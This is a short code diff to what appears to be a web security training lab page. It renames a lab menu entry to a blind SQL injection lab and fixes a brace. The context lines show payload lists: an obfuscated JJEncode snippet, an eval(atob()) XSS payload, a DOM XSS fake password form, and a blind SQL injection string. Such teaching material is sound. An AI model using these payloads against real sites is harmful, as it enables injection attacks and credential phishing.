@@ -123,7 +123,7 @@
                     <option value="/">💬 XSS LAB</option>
                     <option value="/sqli">💉 SQL INJECTION</option>
                     <option value="/stealth">🛡️ EVASION LAB</option>
-		    <option value="/advanced">🧪 ADVANCED LAB</option>
+		    <option value="/blind">🕵️ BLIND SQL LAB</option>
 		    <option value="/sensitive">📂 SENSITIVE DATA</option>
 		    <option value="/dom">⚡ DOM XSS LAB</option>
                 </select>
@@ -197,6 +197,7 @@
                      "JJEncode": "$=~[];$={___:++$,$$$$:(![]+\"\")[$]};",
                      "Base64 Exec": "eval(atob('YWxlcnQoMSk='))"
                  }
+	    },
             '/dom': {
                 "title": "⚡ DOM XSS PAYLOADS",
                 "data": {
@@ -207,7 +208,7 @@
                     "5. Phishing Form": "#<form><input type='password' placeholder='Password'></form>"
                 }
             },
-            '/advanced': {
+            '/blind': {
                 "title": "🧪 BLIND SQL PAYLOADS",
                 "data": {
                     "Blind SQL (True)": "admin' AND 1=1 --",
